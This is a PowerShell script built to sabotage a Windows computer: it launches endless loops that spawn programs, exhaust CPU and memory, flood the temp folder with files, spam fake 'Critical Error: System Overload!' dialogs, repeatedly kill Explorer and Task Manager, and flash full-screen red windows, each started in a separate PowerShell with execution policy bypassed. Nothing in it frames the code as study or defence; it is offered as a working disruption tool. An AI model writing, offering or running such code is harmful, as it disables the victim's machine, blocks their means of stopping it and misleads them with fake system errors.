$wshell = New-Object -ComObject WScript.Shell

function Open-EndlessPrograms {
    while ($true) {
        Start-Process notepad
        Start-Process cmd
        Start-Process explorer
        Start-Process calc
        Start-Process mspaint
        Start-Process write
        Start-Process powershell
    }
}

function Overload-CPU {
    while ($true) {
        1..1000000 | ForEach-Object { [math]::Pow($_, 2) }  # Heavy CPU Calculation
    }
}

function Overload-RAM {
    $array = @()
    while ($true) {
        $array += , (New-Object byte[] (1MB * 50))  # Consumes 50MB RAM per loop
    }
}

function Spam-ErrorMessages {
    while ($true) {
        [System.Windows.Forms.MessageBox]::Show("Critical Error: System Overload!", "Windows Error", 0, 16)
    }
}

function Flood-Disk {
    while ($true) {
        $rand = -join ((65..90) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
        "SYSTEM ERROR: CRASH DETECTED" | Out-File -FilePath "$env:TEMP\$rand.txt"
    }
}

function Disable-UI {
    while ($true) {
        Stop-Process -Name "explorer" -Force
        Stop-Process -Name "taskmgr" -Force
    }
}

function Glitch-Screen {
    while ($true) {
        Add-Type -AssemblyName System.Windows.Forms
        $form = New-Object System.Windows.Forms.Form
        $form.BackColor = "Red"
        $form.WindowState = "Maximized"
        $form.TopMost = $true
        $form.FormBorderStyle = "None"
        $form.Show()
        Start-Sleep -Milliseconds 50
        $form.Close()
    }
}

# RUN ALL CHAOTIC FUNCTIONS **WITHOUT JOBS**
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Open-EndlessPrograms }"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Overload-CPU }"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Overload-RAM }"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Spam-ErrorMessages }"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Flood-Disk }"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Disable-UI }"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Glitch-Screen }"

while ($true) { Start-Sleep 1 }
